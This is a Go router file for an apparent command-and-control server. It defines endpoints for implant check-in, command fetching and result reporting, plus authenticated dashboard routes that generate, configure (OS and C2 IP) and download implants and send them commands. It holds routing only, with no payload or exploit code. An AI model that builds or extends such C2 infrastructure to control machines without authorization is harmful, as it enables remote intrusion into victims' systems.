package routes

import (
	"awesomeProject/controllers"
	"awesomeProject/middleware"
	"github.com/gin-gonic/gin"
)

func SetupRouter() *gin.Engine {
	r := gin.Default()

	// Public routes
	r.POST("/register", controllers.Register)
	r.POST("/login", controllers.Login)
	r.POST("/checkin", controllers.CheckinImplant)
	r.GET("/implant-client/:unique_token/commands", controllers.ImplantClientFetchCommands)
	r.POST("/command-result", controllers.HandleCommandResult)

	// Protected routes (for Dashboard UI)
	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware())
	{
		protected.GET("/implants", controllers.GetUserImplants)
		protected.POST("/generate-implant", controllers.GenerateImplant) // Updated to handle target_os

		protected.POST("/send-command", controllers.SendCommand)
		protected.GET("/implants/:implant_id/commands", controllers.DashboardGetCommandsForImplant)
		protected.DELETE("/implants/:implant_id", controllers.DeleteImplant)

		// New endpoint for configured downloads (OS + C2 IP)
		protected.POST("/implants/:implant_id/download-configured", controllers.DownloadConfiguredImplant)

		// Old download endpoint (may be deprecated or used for default/unconfigured)
		protected.GET("/implants/:implant_id/download", controllers.DownloadImplant)
	}

	return r
}
